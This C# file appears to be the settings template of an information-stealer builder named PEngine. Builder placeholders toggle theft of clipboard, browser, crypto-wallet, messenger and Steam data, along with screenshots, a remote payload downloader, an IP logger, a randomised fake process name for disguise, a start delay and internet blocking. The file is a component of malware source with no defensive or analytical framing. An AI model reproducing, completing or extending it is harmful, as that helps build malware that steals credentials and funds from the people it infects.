namespace PEngine.Main
{
    using System;

    public class Date
    {
        public static bool Buffer = [Buffer_Status];
        public static bool Browsers = [Browsers_Status];
        public static bool Programs = [Programs_Status];
        public static bool CryptoWall = [CryptoWall_Status];
        public static bool Clients = [Messengers_Status];
        public static bool InfoGrabber = true;
        public static bool ScreenShot = [ScreenShot_Status];
        public static bool Steam = [Steam_Status];
        public static bool Downloader = [DLL_Downloader_Status];
        public static string DownloaderLink = "[DownloaderLink]";
        public static string DownloaderPath = "[DownloaderPath]";
        public static string FakeNameProcess = $"{Guid.NewGuid().ToString().Substring(5, 8)}.exe";
        public static bool Delay = [DataBuild.Delay_Status];
        public static bool IpLogger = [IPlogger_Status];
        public static string IpLoggerLink = "IpLoggerLink";
        public static int DelaySec = [DelayTime];
        public static bool BlockInternet = [BlockNet_Status];
    }
}